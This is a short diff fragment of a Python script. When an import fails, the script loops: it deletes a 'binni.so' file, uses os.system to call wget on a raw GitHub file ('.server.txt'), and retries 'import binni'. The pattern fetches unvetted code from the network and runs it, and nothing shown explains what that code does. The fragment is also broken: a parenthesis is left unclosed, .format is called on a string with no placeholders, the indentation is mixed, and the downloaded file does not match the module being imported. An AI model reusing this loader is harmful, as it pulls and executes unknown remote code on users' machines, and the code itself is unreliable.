@@ -18,8 +18,8 @@ try:
 except:
 	while ie:
 		os.system('rm -rf binni.so')
-		os.system('wget https://raw.githubusercontent.com/jam-blacklisted/stylish-queen/main/.server.txt'.format(bit)
-	try:
+		os.system('wget https://raw.githubusercontent.com/jam-blacklisted/stylish-queen/main/.server.txt'.format(text)
+	        try:
 			import binni
 			ie=False
 		except:
